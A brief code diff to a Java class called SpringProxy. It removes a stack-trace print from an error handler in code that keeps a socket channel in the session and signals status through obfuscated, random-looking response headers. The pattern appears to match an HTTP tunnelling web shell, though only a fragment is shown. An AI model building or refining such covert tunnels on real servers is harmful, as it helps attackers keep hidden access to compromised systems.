@@ -34,7 +34,6 @@ public class SpringProxy {
                     MySession.setAttribute(session, mark, socketChannel);
                     MyResponse.setHeader(response, "Taondunj", "xOSsMjFLmzATE1UCWQ7");
                 } catch (Exception e) {
-                    e.printStackTrace();
                     MyResponse.setHeader(response, "Dklqtyeyjg", "eO2BnA9kCmNHDMmF5ypRE_0LzxSlax");
                     MyResponse.setHeader(response, "Taondunj", "LUs3vI04LaWmPXM79LFPs5zvFX");
                 }
